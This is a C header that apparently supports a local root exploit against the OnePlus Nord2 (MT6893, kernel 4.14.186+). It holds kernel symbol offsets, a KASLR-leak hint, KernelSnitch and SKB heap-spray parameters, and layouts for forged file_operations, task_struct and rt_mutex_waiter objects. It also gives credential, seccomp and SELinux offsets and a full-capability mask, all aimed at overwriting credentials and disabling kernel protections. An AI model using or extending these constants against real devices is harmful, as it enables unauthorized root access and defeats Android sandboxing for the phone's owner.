/*
 * Nord2 (DN2101) kernel 4.14.186+ MT6893 symbol offsets
 * All offsets are relative to _stext (boot-stable, KASLR-independent)
 * Derived via ADRP disassembly of kernel image + /proc/iomem physical layout
 */
#pragma once
#include <stdint.h>

/* Physical memory layout (from /proc/iomem) */
#define PHYS_STEXT        0x40100000ULL   /* kernel code phys start */
#define PHYS_DATA_START   0x41d60000ULL   /* kernel data phys start */
#define PHYS_DATA_END     0x42e5ffffULL

/* VA_BITS=39, PAGE_OFFSET=0xffffff8000000000 */
#define KIMAGE_VOFFSET_DELTA  (PHYS_STEXT)  /* stext_virt - stext_phys */

/* ── Data symbol offsets from _stext ───────────────────────────── */
#define INIT_TASK_OFF           0x01c6d300ULL
#define INIT_CRED_OFF           0x01c976a8ULL
#define ASHMEM_FOPS_OFF         0x01c6d2c8ULL  /* ashmem file_operations */
#define ASHMEM_MISC_FOPS_OFF    0x01f6ace0ULL  /* misc device fops ptr */
#define SELINUX_ENFORCING_OFF   0x02272fd8ULL  /* int selinux_enforcing */
#define SELINUX_STATE_OFF       0x01cd9b20ULL
#define SECURITY_HOOK_HEADS_OFF 0x01c67140ULL
#define KMALLOC_CACHES_OFF      0x01cb4970ULL
#define EMPTY_ZERO_PAGE_OFF     0x01c6ec10ULL
#define ROOT_TASK_GROUP_OFF     0x01c6e2c8ULL
#define ANON_PIPE_BUF_OPS_OFF   0x01c7a7c8ULL  /* pipe_buf_operations */
#define SYSCTL_BOOTID_OFF       0x02327618ULL  /* random boot ID data */
#define NFULNL_LOGGER_OFF       0x02d4b0f8ULL  /* nfulnl_logger ptr */

/* ── Function offsets from _stext ───────────────────────────────── */
#define NOOP_LLSEEK_OFF              0x001fd140ULL
#define ASHMEM_IOCTL_OFF             0x00d8563cULL
#define ASHMEM_COMPAT_IOCTL_OFF      0x00d85f18ULL
#define ASHMEM_MMAP_OFF              0x00d85f64ULL
#define ASHMEM_OPEN_OFF              0x00d860ccULL
#define ASHMEM_RELEASE_OFF           0x00d8614cULL
#define ASHMEM_SHOW_FDINFO_OFF       0x00d8614cULL  /* same as release approx */
#define CONFIGFS_READ_ITER_OFF       0x002a5bdcULL
#define CONFIGFS_BIN_WRITE_ITER_OFF  0x002a60f4ULL
#define COPY_SPLICE_READ_OFF         0x0020c39cULL  /* generic_file_splice_read */
#define CAP_CAPABLE_OFF              0x003cb62cULL
#define SYS_PERF_EVENT_OPEN_OFF      0x0016f70cULL  /* for KASLR leak */

/* ── KernelSnitch parameters for MT6893 ────────────────────────── */
#define MM_STRUCT_SZ    0x500
#define MM_ORDER        3            /* order-3 slab = 8 pages */
#define KSNITCH_COLLISIONS 4
/* physmap covers 48 GB from 0xffffff8000000000 */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL

/* ── SKB spray constants ────────────────────────────────────────── */
#define ORDER3_SIZE     (4096UL << MM_ORDER)   /* 32768 = 0x8000 */
#define SKB_SEND_SIZE   (ORDER3_SIZE * 2)      /* 65536 */
#define SKB_DATA_DELTA  (-0xe80LL)             /* SKB headroom to data */
#define SKB_FRAG_BIAS   0

/* ── Fake kernel page layout offsets (within ORDER3 page) ──────── */
#define LOCK_OFF        0x0E80
#define W0_OFF          0x1180
#define FOPS_OFF        0x0F80
#define FOPS_TABLE_OFF  0x0F80
#define SCRATCH_OFF     0x1200
#define RIGHT_OFF       0x1240
#define LEFT_OFF        0x1260
#define FAKE_TASK_OFF   0x1280
#define CRED_COPY_OFF   0x1080

/* ── rt_mutex_waiter field offsets ─────────────────────────────── */
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PRIO_OFF           0x18
#define WAITER_DEADLINE_OFF       0x20
#define WAITER_PI_TREE_ENTRY_OFF  0x28
#define WAITER_PI_TREE_PRIO_OFF   0x40
#define WAITER_PI_TREE_DEADLINE_OFF 0x48
#define WAITER_TASK_OFF           0x50
#define WAITER_LOCK_OFF           0x58
#define WAITER_WAKE_STATE_OFF     0x60
#define WAITER_LOCAL_OFF          0x80

/* ── file_operations field offsets ─────────────────────────────── */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x10
#define FOPS_READ_OFF         0x18
#define FOPS_WRITE_OFF        0x20
#define FOPS_READ_ITER_OFF    0x28
#define FOPS_WRITE_ITER_OFF   0x30
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

/* ── Fake task_struct field offsets ────────────────────────────── */
#define FAKE_TASK_USAGE_OFF       0x40
#define FAKE_TASK_PRIO_OFF        0x94
#define FAKE_TASK_NORMAL_PRIO_OFF 0x9c
#define FAKE_TASK_PI_LOCK_OFF     0x9ec
#define FAKE_TASK_PI_WAITERS_OFF  0xa00
#define FAKE_TASK_TASK_GROUP_OFF  0x420
#define FAKE_TASK_PI_TOP_TASK_OFF 0xa10
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0xa18

/* ── task_struct field offsets ──────────────────────────────────── */
#define TASK_PRIO_OFF       0x94
#define TASK_NORMAL_OFF     0x9c
#define TASK_REAL_CRED_OFF  0x8f8
#define TASK_CRED_OFF       0x900
#define TASK_COMM_OFF       0x910
#define TASK_PID_OFF        0x708
#define TASK_TGID_OFF       0x70c
#define TASK_TASKS_OFF      0x638
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_ATOMIC_FLAGS_OFF 0x6c8
#define TASK_SECCOMP_OFF    0x9c8

/* ── cred struct offsets ────────────────────────────────────────── */
#define CRED_USAGE_OFF      0
#define CRED_UID_OFF        8
#define CRED_SECUREBITS_OFF 40
#define CRED_CAPS_OFF       48
#define CRED_SECURITY_OFF   128
#define CRED_CAP_WORDS      5

/* ── pipe_buffer offsets ─────────────────────────────────────────  */
#define PIPE_BUFFER_SIZE      0x28
#define PIPE_BUFFER_SLOTS     32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_BUFS_OFF         0xa8

/* ── seccomp offsets ─────────────────────────────────────────────  */
#define SECCOMP_MODE_OFF         0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF       0x08
#define TIF_SECCOMP_BIT          11
#define PFA_NO_NEW_PRIVS_BIT     0

/* ── SELinux ─────────────────────────────────────────────────────  */
#define SELINUX_KERNEL_SID   1
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_SID_OFF  4

/* ── pselect write route ─────────────────────────────────────────  */
#define PSELECT_ROUTE_NFDS     320
#define PSELECT_WAITER_WORD_SHIFT 0
#define FAKE_TASK_PRIO         120
#define FAKE_WAITER_PRIO       140
#define CAP_FULL               0x000001ffffffffffULL

/* ── Misc ────────────────────────────────────────────────────────  */
#define TASK_COMM_LEN 16
#define MM_OWNER_OFF  0x410

static inline uint64_t text_addr(uint64_t stext, uint64_t off) {
    return stext + off;
}
static inline uint64_t data_addr(uint64_t stext, uint64_t off) {
    return stext + off;
}
